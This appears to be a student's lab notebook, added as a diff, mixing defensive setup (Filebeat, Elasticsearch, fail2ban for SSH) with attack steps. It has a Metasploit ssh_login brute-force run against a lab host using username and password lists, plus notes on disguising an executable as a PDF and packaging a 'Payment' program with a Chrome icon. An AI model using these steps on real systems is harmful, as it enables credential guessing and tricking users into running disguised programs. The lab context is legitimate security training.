@@ -1,0 +1,77 @@
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
+    link/ether 00:0c:29:83:f3:65 brd ff:ff:ff:ff:ff:ff
+    inet 192.168.101.134/24 brd 192.168.101.255 scope global dynamic noprefixroute eth0
+       valid_lft 1678sec preferred_lft 1678sec
+    inet6 fe80::11ca:f9a4:8a7c:64e3/64 scope link noprefixroute 
+       valid_lft forever preferred_lft forever
+
+
+192.168.101.134
+
+IR-Elast
+208.8.8.133 5601
+
+sudo nano /etc/filebeat/filebeat.yml
+sudo systemctl restart filebeat
+sudo systemctl enable elasticsearch
+
+http://208.8.8.133:5601
+search ssh_login
+use 0
+show options
+set rhost 208.8.8.133
+set user_file /home/kali/Desktop/Username
+set pass_file /home/kali/Desktop/Password
+set verbose true
+show options
+exploit
+
+
+sudo dnf -y install fail2ban
+sudo systemctl enable -- now fail2ban
+fail2ban-client status sshd
+sudo nano /etc/fail2ban/jail.local
+
+enabled - true
+port = ssh
+logpath = /var/log/secure
+bantime = 300
+findtime = 60
+action = firewallcmd-allports
+
+sudo systemctl restart fail2ban
+fail2ban-client status sshd
+sudo fail2ban-client set sshd unbanip "attacker ip address"
+
+
+
+****************************************************************
+
+sudo mkdir -p /mnt/hgfs/
+sudo vmhgfs-fuse .host:/exe-to-pdf /mnt/hgfs -o allow_other
+ls /mnt/hgfs
+
+
+rename: 1mb.exe to high-level-complexe.pdf
+
+file /mnt/hgfs/1mb.exe
+
+EMULATOR
+cd /mnt/hgfs
+ls -lb
+file -- *
+
+****************************************************************
+Visual Studio Code
+
+python -m PyInstaller --onefile --windowed --name Payment --icon "chrome.ico" --add-data "QRCODE.jpg;." --add-data "alert (2).wav;." QR.py
+
+python -m PyInstaller --onefile --windowed --name Payment --add-data "QRCODE.jpg;." --add-data "alert (2).wav;." QR.py
+
+
+
+
+
+
+
+
